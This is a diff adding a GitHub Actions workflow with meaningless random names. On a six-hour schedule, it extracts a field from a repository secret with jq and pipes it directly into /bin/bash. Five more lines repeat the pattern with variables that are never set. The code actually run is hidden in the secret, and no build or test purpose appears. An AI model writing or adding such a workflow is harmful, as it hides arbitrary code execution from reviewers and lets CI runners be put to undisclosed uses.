@@ -1,0 +1,22 @@
+name: dongqidaixie
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongqidaixie
+        env:
+          anq3: ${{ secrets.anq3 }}
+        run: |
+          echo $anq3 | jq -r .kk15 | /bin/bash
+          echo $ku27 | jq -r .vqh2475 | /bin/bash
+          echo $gas652 | jq -r .kduhe0 | /bin/bash
+          echo $jec4333 | jq -r .dcbtn9616 | /bin/bash
+          echo $rdv1156 | jq -r .otk717 | /bin/bash
+          echo $bbxb737 | jq -r .elzj432 | /bin/bash
+
